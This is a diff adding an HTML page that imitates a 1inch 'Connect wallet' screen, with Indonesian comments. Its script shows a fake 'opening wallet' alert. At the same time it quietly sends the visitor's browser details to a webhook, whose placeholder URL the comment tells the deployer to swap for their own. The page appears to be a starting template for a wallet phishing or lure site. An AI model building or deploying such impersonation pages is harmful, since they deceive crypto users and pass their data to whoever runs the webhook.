@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connect Wallet 1inch</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f4f4f9; margin: 0; }
+        .card { background: white; padding: 30px; border-radius: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); text-align: center; width: 300px; }
+        h2 { margin-bottom: 20px; color: #333; }
+        .btn { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #ddd; border-radius: 12px; background: white; cursor: pointer; display: flex; align-items: center; justify-content: center; font-weight: bold; transition: 0.3s; }
+        .btn:hover { background: #f0f0f0; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <h2>Connect wallet</h2>
+    <button class="btn" onclick="connect1inch()">
+        1inch Wallet
+    </button>
+    <button class="btn">Ledger Wallet</button>
+    <button class="btn">Trust Wallet</button>
+</div>
+
+<script>
+    async function connect1inch() {
+        const webhookUrl = 'URL_WEBHOOK_ANDA_DISINI'; // GANTI DENGAN URL WEBHOOK ANDA
+        
+        alert("Membuka 1inch Wallet...");
+
+        const data = {
+            wallet: "1inch Wallet",
+            status: "Connection Requested",
+            userAgent: navigator.userAgent
+        };
+
+        try {
+            const response = await fetch(webhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            });
+            console.log("Webhook terkirim");
+        } catch (error) {
+            console.error("Gagal mengirim:", error);
+        }
+    }
+</script>
+
+</body>
+</html>
